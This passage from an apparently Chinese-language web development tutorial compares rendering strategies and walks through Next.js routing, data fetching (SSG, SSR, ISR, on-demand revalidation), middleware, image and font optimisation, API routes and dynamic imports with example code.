align="left">差</td><td align="left">慢</td><td align="left">后台系统、Dashboard</td></tr><tr><td align="left">服务器端渲染 (SSR)</td><td align="left">服务器生成完整 HTML</td><td align="left">优</td><td align="left">快</td><td align="left">内容网站、电商</td></tr><tr><td align="left">静态站点生成 (SSG)</td><td align="left">构建时生成 HTML</td><td align="left">优</td><td align="left">极快</td><td align="left">博客、文档站</td></tr><tr><td align="left">增量静态再生 (ISR)</td><td align="left">按需重新生成页面</td><td align="left">优</td><td align="left">快</td><td align="left">动态内容站点</td></tr></tbody></table><p><strong>SSR 核心优势</strong></p><ul><li>SEO 优化：搜索引擎可直接抓取完整 HTML 内容</li><li>性能提升：减少首屏内容可见时间（FCP）</li><li>社交分享优化：社交媒体爬虫获取完整页面内容</li><li>低端设备支持：服务器处理渲染工作，降低客户端压力</li></ul><h3 id="Next-js-核心架构"><a href="#Next-js-核心架构" class="headerlink" title="Next.js 核心架构"></a>Next.js 核心架构</h3><p><strong>Next.js 核心特性</strong></p><pre class="mermaid">graph TD    A[Next.js] --> B[路由系统]    A --> C[渲染策略]    A --> D[数据获取]    A --> E[API 路由]    A --> F[优化功能]        B --> B1[文件系统路由]    B --> B2[动态路由]    B --> B3[嵌套路由]        C --> C1[SSG 静态生成]    C --> C2[SSR 服务器渲染]    C --> C3[ISR 增量再生]        D --> D1[getStaticProps]    D --> D2[getServerSideProps]    D --> D3[getStaticPaths]        E --> E1[无服务器 API]    E --> E2[中间件支持]        F --> F1[Image 优化]    F --> F2[字体优化]    F --> F3[脚本优化]</pre><p><strong>文件系统路由</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">pages/<br>├── index.js          <span class="hljs-comment"># / 根路由</span><br>├── about.js          <span class="hljs-comment"># /about</span><br>├── blog/<br>│   ├── index.js      <span class="hljs-comment"># /blog</span><br>│   ├── [slug].js     <span class="hljs-comment"># /blog/:slug 动态路由</span><br>│   └── categories/<br>│       └── [<span class="hljs-built_in">id</span>].js   <span class="hljs-comment"># /blog/categories/:id 嵌套路由</span><br>└── api/<br>    └── user.js       <span class="hljs-comment"># /api/user API 路由</span><br></code></pre></td></tr></table></figure><h3 id="数据获取策略"><a href="#数据获取策略" class="headerlink" title="数据获取策略"></a>数据获取策略</h3><p><strong>静态生成 (SSG)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 页面组件</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Blog</span>(<span class="hljs-params">&#123; posts &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">      &#123;posts.map(post =&gt; (</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;post.id&#125;</span>&gt;</span>&#123;post.title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">      ))&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 构建时获取数据</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticProps</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>);<br>  <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; posts &#125;,<br>    <span class="hljs-attr">revalidate</span>: <span class="hljs-number">60</span> <span class="hljs-comment">// 启用 ISR，60秒后重新生成</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 动态路由路径生成</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticPaths</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/posts&#x27;</span>);<br>  <span class="hljs-keyword">const</span> posts = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">const</span> paths = posts.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">post</span> =&gt;</span> (&#123;<br>    <span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">slug</span>: post.<span class="hljs-property">slug</span> &#125;<br>  &#125;));<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    paths,<br>    <span class="hljs-attr">fallback</span>: <span class="hljs-string">&#x27;blocking&#x27;</span> <span class="hljs-comment">// 处理未预生成的路径</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>服务器端渲染 (SSR)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; user &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;user.bio&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 每次请求时获取数据</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getServerSideProps</span>(<span class="hljs-params">context</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; req, res, params, query &#125; = context;<br>  <br>  <span class="hljs-comment">// 基于 cookie 认证</span><br>  <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">authToken</span>;<br>  <br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users/<span class="hljs-subst">$&#123;params.id&#125;</span>`</span>, &#123;<br>    <span class="hljs-attr">headers</span>: &#123; <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">$&#123;token&#125;</span>`</span> &#125;<br>  &#125;);<br>  <br>  <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">redirect</span>: &#123;<br>        <span class="hljs-attr">destination</span>: <span class="hljs-string">&#x27;/login&#x27;</span>,<br>        <span class="hljs-attr">permanent</span>: <span class="hljs-literal">false</span><br>      &#125;<br>    &#125;;<br>  &#125;<br>  <br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; user &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高级渲染策略"><a href="#高级渲染策略" class="headerlink" title="高级渲染策略"></a>高级渲染策略</h3><p><strong>增量静态再生 (ISR)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticProps</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/products&#x27;</span>);<br>  <span class="hljs-keyword">const</span> products = <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">json</span>();<br>  <br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">props</span>: &#123; products &#125;,<br>    <span class="hljs-attr">revalidate</span>: <span class="hljs-number">30</span>, <span class="hljs-comment">// 最多每30秒重新生成一次</span><br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getStaticPaths</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">paths</span>: [<br>      &#123; <span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">category</span>: <span class="hljs-string">&#x27;electronics&#x27;</span> &#125; &#125;<br>    ],<br>    <span class="hljs-attr">fallback</span>: <span class="hljs-string">&#x27;blocking&#x27;</span> <span class="hljs-comment">// 其他类别按需生成</span><br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>按需再验证 (On-demand Revalidation)</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// pages/api/revalidate.js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-comment">// 检查密钥</span><br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">query</span>.<span class="hljs-property">secret</span> !== process.<span class="hljs-property">env</span>.<span class="hljs-property">REVALIDATE_SECRET</span>) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">401</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Invalid token&#x27;</span> &#125;);<br>  &#125;<br>  <br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 重新验证特定路径</span><br>    <span class="hljs-keyword">await</span> res.<span class="hljs-title function_">revalidate</span>(<span class="hljs-string">&#x27;/blog/&#x27;</span> + req.<span class="hljs-property">query</span>.<span class="hljs-property">slug</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">revalidated</span>: <span class="hljs-literal">true</span> &#125;);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Error revalidating&#x27;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 内容更新后调用</span><br><span class="hljs-comment">// POST /api/revalidate?secret=&lt;token&gt;&amp;slug=new-post</span><br></code></pre></td></tr></table></figure><h3 id="Next-js-高级特性"><a href="#Next-js-高级特性" class="headerlink" title="Next.js 高级特性"></a>Next.js 高级特性</h3><p><strong>中间件</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// middleware.js</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">NextResponse</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/server&#x27;</span>;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-comment">// 重定向旧路径</span><br>  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;/old-blog&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;/blog&#x27;</span>, request.<span class="hljs-property">url</span>));<br>  &#125;<br>  <br>  <span class="hljs-comment">// 路径重写</span><br>  <span class="hljs-keyword">if</span> (request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span> === <span class="hljs-string">&#x27;/dashboard&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">rewrite</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;/internal-dashboard&#x27;</span>, request.<span class="hljs-property">url</span>));<br>  &#125;<br>  <br>  <span class="hljs-comment">// 身份验证检查</span><br>  <span class="hljs-keyword">const</span> token = request.<span class="hljs-property">cookies</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;authToken&#x27;</span>);<br>  <span class="hljs-keyword">if</span> (!token &amp;&amp; request.<span class="hljs-property">nextUrl</span>.<span class="hljs-property">pathname</span>.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;/protected&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, request.<span class="hljs-property">url</span>));<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();<br>&#125;<br><br><span class="hljs-comment">// 配置匹配路径</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = &#123;<br>  <span class="hljs-attr">matcher</span>: [<span class="hljs-string">&#x27;/dashboard/:path*&#x27;</span>, <span class="hljs-string">&#x27;/protected/:path*&#x27;</span>, <span class="hljs-string">&#x27;/old-blog/:path*&#x27;</span>]<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>图像优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Image</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/image&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductImage</span>(<span class="hljs-params">&#123; src, alt &#125;</span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Image</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">src</span>=<span class="hljs-string">&#123;src&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">alt</span>=<span class="hljs-string">&#123;alt&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">width</span>=<span class="hljs-string">&#123;800&#125;</span>  // <span class="hljs-attr">最大显示宽度</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">height</span>=<span class="hljs-string">&#123;600&#125;</span> // <span class="hljs-attr">最大显示高度</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;blur&quot;</span> // <span class="hljs-attr">加载占位符</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">blurDataURL</span>=<span class="hljs-string">&quot;data:image/svg+xml;base64,...&quot;</span> // <span class="hljs-attr">低质量占位图</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">quality</span>=<span class="hljs-string">&#123;85&#125;</span> // <span class="hljs-attr">图像质量</span> (<span class="hljs-attr">1-100</span>)</span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">priority</span> // <span class="hljs-attr">关键图像优先加载</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">sizes</span>=<span class="hljs-string">&quot;(max-width: 768px) 100vw, 50vw&quot;</span> // <span class="hljs-attr">响应式尺寸</span></span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>API 路由</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// pages/api/user/[id].js</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = req.<span class="hljs-property">query</span>;<br>  <br>  <span class="hljs-keyword">switch</span> (req.<span class="hljs-property">method</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;GET&#x27;</span>:<br>      <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> db.<span class="hljs-property">user</span>.<span class="hljs-title function_">findUnique</span>(&#123; <span class="hljs-attr">where</span>: &#123; id &#125; &#125;);<br>      <span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;User not found&#x27;</span> &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(user);<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;PUT&#x27;</span>:<br>      <span class="hljs-keyword">const</span> updatedUser = <span class="hljs-keyword">await</span> db.<span class="hljs-property">user</span>.<span class="hljs-title function_">update</span>(&#123;<br>        <span class="hljs-attr">where</span>: &#123; id &#125;,<br>        <span class="hljs-attr">data</span>: req.<span class="hljs-property">body</span><br>      &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">json</span>(updatedUser);<br>    <br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;DELETE&#x27;</span>:<br>      <span class="hljs-keyword">await</span> db.<span class="hljs-property">user</span>.<span class="hljs-title function_">delete</span>(&#123; <span class="hljs-attr">where</span>: &#123; id &#125; &#125;);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">204</span>).<span class="hljs-title function_">end</span>();<br>    <br>    <span class="hljs-attr">default</span>:<br>      res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&#x27;Allow&#x27;</span>, [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;PUT&#x27;</span>, <span class="hljs-string">&#x27;DELETE&#x27;</span>]);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">405</span>).<span class="hljs-title function_">end</span>(<span class="hljs-string">`Method <span class="hljs-subst">$&#123;req.method&#125;</span> Not Allowed`</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="性能优化实践-1"><a href="#性能优化实践-1" class="headerlink" title="性能优化实践"></a>性能优化实践</h3><p><strong>代码分割与动态导入</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> dynamic <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/dynamic&#x27;</span>;<br><br><span class="hljs-comment">// 动态加载重组件（禁用 SSR）</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">HeavyChart</span> = <span class="hljs-title function_">dynamic</span>(<br>  <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../components/HeavyChart&#x27;</span>),<br>  &#123; <span class="hljs-attr">ssr</span>: <span class="hljs-literal">false</span> &#125;<br>);<br><br><span class="hljs-comment">// 带加载状态</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MapComponent</span> = <span class="hljs-title function_">dynamic</span>(<br>  <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../components/Map&#x27;</span>),<br>  &#123; <br>    <span class="hljs-attr">loading</span>: <span class="hljs-function">() =&gt;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Loading map...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-attr">ssr</span>: <span class="hljs-literal">false</span><br>  &#125;<br>);<br><br><span class="hljs-comment">// 预加载关键组件</span><br><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;../components/CriticalComponent&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">module</span> =&gt;</span> &#123;<br>    <span class="hljs-comment">// 组件已加载</span><br>  &#125;);<br>&#125;, []);<br></code></pre></td></tr></table></figure><p><strong>字体优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// _document.js</span><br><span class="hljs-keyword">import</span> <span class="hljs-title class_">Document</span>, &#123; <span class="hljs-title class_">Html</span>, <span class="hljs-title class_">Head</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;next/document&#x27;</span>;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDocument</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Document</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Html</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Head</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">link</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;preload&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/fonts/Inter.woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">as</span>=<span class="hljs-string">&quot;font&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;font/woff2&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">crossOrigin</span>=<span class="hljs-string">&quot;anonymous&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Head</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Main</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">NextScript</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Html</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 全局 CSS 中使用</span><br>@font-face &#123;<br>  font-<span class="hljs-attr">family</span>: <span class="hljs-string">&#x27;Inter&#x27;</span>;<br>  <span class="hljs-attr">src</span>: <span class="hljs-title function_">url</span>(<span class="hljs-string">&#x27;/fonts/Inter.woff2&#x27;</span>) <span class="hljs-title function_">format</span>(<span class="hljs-string">&#x27;woff2&#x27;</span>);<br>  font-<span class="hljs-attr">weight</span>: <span class="hljs-number">100</span> <span class="hljs-number">900</span>;<br>  font-<span 